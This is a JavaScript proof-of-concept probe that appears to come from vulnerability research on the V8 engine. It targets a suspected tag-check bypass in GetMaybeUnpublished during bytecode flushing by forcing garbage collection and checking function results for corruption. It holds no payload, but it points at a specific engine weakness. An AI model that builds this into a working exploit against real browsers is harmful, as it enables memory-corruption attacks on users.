// PoC 3: GetMaybeUnpublished Tag-Validation Bypass
// Target: trusted-pointer-table-inl.h:63-70
//         mark-compact.cc:3785  (called with kBytecodeArrayIndirectPointerTag
//         while the entry actually holds UncompiledData — tag check bypassed
//         for unpublished entries)
//
// Strategy: BYTECODE FLUSHING PROBE
//   Bytecode flushing transitions a SharedFunctionInfo's trusted pointer from
//   BytecodeArray → UncompiledData during a mark-compact GC.  During this
//   window the table entry is in "unpublished" state and GetMaybeUnpublished
//   is called with the WRONG expected tag (BytecodeArray) while the value is
//   UncompiledData — the type check is silently skipped.
//
//   We exercise the path by:
//   1. Creating a function that gets compiled (has BytecodeArray).
//   2. Making it "cold" so the GC decides to flush its bytecode.
//   3. Triggering a major GC.
//   4. Re-calling the function — it must be re-compiled from source.
//   If the binary crashes or the re-call returns a wrong value, the
//   unpublished entry handling is buggy.
//
// Flags: --allow-natives-syntax --expose-gc
//        --flush-bytecode  (or equivalent)

"use strict";

// Create a function and get it compiled
function coldFn(x) { return x * x + 1; }

// Call it a few times to warm (get BytecodeArray allocated)
for (let i = 0; i < 10; i++) coldFn(i);

const before = coldFn(7);   // 7*7+1 = 50
print("Before GC flush: coldFn(7) = " + before + "  (expected 50)");

// Mark coldFn as inactive so V8 considers it for bytecode flushing
// (aging is done by the GC; multiple major GCs age the function)
if (typeof gc === "function") {
  gc();   // first GC — ages bytecode
  gc();   // second GC — may flush bytecode (depends on --bytecode-aging threshold)
  gc();   // third GC  — flush more aggressively
} else {
  print("[!] gc() not exposed — run with --expose-gc");
}

// Force a major (mark-compact) GC that exercises the flushing path
// where GetMaybeUnpublished is called
if (typeof gc === "function") {
  gc({ type: "major" });
}

// Re-invoke: if bytecode was flushed the function must be recompiled;
// if GetMaybeUnpublished returned a wrong object the re-compilation
// either crashes or produces wrong output.
try {
  const after = coldFn(7);
  print("After  GC flush: coldFn(7) = " + after + "  (expected 50)");
  if (after !== 50) {
    print("!!! WRONG VALUE after bytecode flush — tag-bypass may have corrupted SFI !!!");
  } else {
    print("Bytecode flush round-trip OK — no observable corruption.");
  }
} catch(e) {
  print("!!! EXCEPTION after bytecode flush: " + e);
  print("    This may indicate SFI corruption via GetMaybeUnpublished bug.");
}

// Probe: call many different functions to stress the unpublished-entry window
const fns = [];
for (let i = 0; i < 200; i++) {
  fns.push(new Function("x", "return x + " + i + ";"));
}
// Call each once (allocates BytecodeArray), then flush, then re-call
fns.forEach(f => f(1));
if (typeof gc === "function") gc({ type: "major" });
let wrong = 0;
fns.forEach((f, i) => {
  const r = f(0);
  if (r !== i) wrong++;
});
if (wrong > 0) {
  print("!!! " + wrong + " functions returned wrong value after bytecode flush — CORRUPTION confirmed.");
} else {
  print("All " + fns.length + " functions returned correct values after GC flush.");
}
